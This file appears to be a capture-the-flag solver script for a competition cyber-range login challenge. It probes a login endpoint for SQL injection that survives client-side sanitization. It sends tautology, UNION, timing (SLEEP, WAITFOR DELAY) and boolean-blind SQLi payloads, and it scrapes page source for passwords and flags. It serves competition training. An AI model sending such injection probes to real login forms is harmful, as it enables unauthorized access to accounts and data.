#!/usr/bin/env python3
"""
Browser automation approach to bypass client-side sanitization
This script can be used with selenium if needed
"""

import requests
import re
import json

def analyze_js_sanitization():
    """Analyze the JavaScript sanitization to find bypasses"""
    
    print("[*] Analyzing JavaScript sanitization logic...")
    print("[*] Pattern: /[^a-zA-Z 0-9]+/g")
    print("[*] This removes everything EXCEPT: letters, numbers, and spaces")
    
    # Test what gets through the filter
    test_inputs = [
        "admin' OR '1'='1'--",  # Original SQLi
        "admin OR 1 1",         # After sanitization
        "admin UNION SELECT",   # SQL keywords with spaces
        "admin OR a a",         # Letter-based logic
        "admin AND 1 1",        # Alternative logic
        "admin XOR 0 0",        # XOR logic
        "admin admin",          # Simple duplication
        "a OR 1 1",             # Short version
        "x OR y y",             # Even shorter
    ]
    
    pattern = re.compile(r'[^a-zA-Z 0-9]+')
    
    print("\n[*] Testing what survives sanitization:")
    for input_str in test_inputs:
        sanitized = pattern.sub('', input_str)
        print(f"'{input_str}' -> '{sanitized}'")
    
    return test_inputs

def test_timing_attack():
    """Test for SQL injection using timing attacks"""
    
    base_url = "https://sanitize.challenges.virginiacyberrange.net/login"
    
    # Payloads that might cause delays if SQLi exists
    timing_payloads = [
        "admin AND SLEEP 5",      # After sanitization: "admin AND SLEEP 5"
        "admin OR SLEEP 3",       # After sanitization: "admin OR SLEEP 3"
        "admin WAITFOR DELAY",    # SQL Server syntax
        "admin pg sleep 2",       # PostgreSQL syntax
    ]
    
    print("\n[*] Testing timing-based SQL injection...")
    
    for payload in timing_payloads:
        # Simulate the client-side sanitization
        sanitized_payload = re.sub(r'[^a-zA-Z 0-9]+', '', payload)
        print(f"[*] Testing timing payload: '{sanitized_payload}'")
        
        import time
        start_time = time.time()
        
        try:
            response = requests.post(
                base_url,
                data={'username': sanitized_payload, 'password': 'test'},
                timeout=10
            )
            end_time = time.time()
            
            response_time = end_time - start_time
            print(f"[*] Response time: {response_time:.2f} seconds")
            
            if response_time > 3:  # If response takes longer than 3 seconds
                print(f"[+] POTENTIAL TIMING ATTACK SUCCESS with: {sanitized_payload}")
                print(f"[+] Response time: {response_time:.2f}s indicates possible SQLi")
                
        except requests.Timeout:
            print(f"[+] TIMEOUT occurred with payload: {sanitized_payload}")
            print("[+] This might indicate successful SQL injection!")
        except Exception as e:
            print(f"[-] Error: {e}")

def test_boolean_blind_sqli():
    """Test for boolean-based blind SQL injection"""
    
    base_url = "https://sanitize.challenges.virginiacyberrange.net/login"
    
    # Test true vs false conditions
    true_conditions = [
        "admin AND 1 1",     # Should be true if SQLi works
        "admin OR 1 1",      # Should always be true
        "admin AND a a",     # String comparison
    ]
    
    false_conditions = [
        "admin AND 1 0",     # Should be false
        "admin AND 0 0",     # Should be false
        "admin AND a b",     # Different strings
    ]
    
    print("\n[*] Testing boolean-based blind SQL injection...")
    
    def test_condition(payload, condition_type):
        sanitized = re.sub(r'[^a-zA-Z 0-9]+', '', payload)
        try:
            response = requests.post(
                base_url,
                data={'username': sanitized, 'password': 'test'},
                timeout=5
            )
            return len(response.text), response.status_code, response.text
        except:
            return None, None, None
    
    # Get baseline response
    baseline_len, baseline_status, baseline_text = test_condition("nonexistentuser", "baseline")
    print(f"[*] Baseline response length: {baseline_len}")
    
    # Test true conditions
    for payload in true_conditions:
        length, status, text = test_condition(payload, "true")
        if length and length != baseline_len:
            print(f"[+] Different response for TRUE condition '{payload}': {length} vs {baseline_len}")
            if 'flag' in text.lower():
                print(f"[+] FLAG FOUND with payload: {payload}")
                print(text)
    
    # Test false conditions
    for payload in false_conditions:
        length, status, text = test_condition(payload, "false")
        if length and length != baseline_len:
            print(f"[+] Different response for FALSE condition '{payload}': {length} vs {baseline_len}")

def check_source_for_clues():
    """Check the page source for any clues"""
    
    try:
        response = requests.get("https://sanitize.challenges.virginiacyberrange.net/")
        content = response.text
        
        print("\n[*] Analyzing page source for clues...")
        
        # Look for HTML comments
        comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL)
        if comments:
            print("[+] Found HTML comments:")
            for comment in comments:
                print(f"    {comment.strip()}")
        
        # Look for JavaScript variables or hidden data
        js_vars = re.findall(r'var\s+(\w+)\s*=\s*["\']([^"\']+)["\']', content)
        if js_vars:
            print("[+] Found JavaScript variables:")
            for var_name, var_value in js_vars:
                print(f"    {var_name} = {var_value}")
        
        # Look for any credentials or hints
        patterns = [
            (r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'password'),
            (r'username["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'username'),
            (r'flag["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'flag'),
            (r'admin["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'admin'),
        ]
        
        for pattern, desc in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"[+] Found {desc} references:")
                for match in matches:
                    print(f"    {match}")
        
        # Save the source for manual analysis
        with open('/workspaces/SkillsUSA-Nats-2025/website/page_source.html', 'w') as f:
            f.write(content)
        print("[*] Page source saved to page_source.html")
        
    except Exception as e:
        print(f"[-] Error fetching page source: {e}")

def main():
    print("[*] Starting comprehensive login bypass analysis...")
    
    # Analyze the sanitization
    analyze_js_sanitization()
    
    # Check source for clues
    check_source_for_clues()
    
    # Test different SQLi approaches
    test_boolean_blind_sqli()
    test_timing_attack()
    
    print("\n[*] Analysis complete!")

if __name__ == "__main__":
    main()
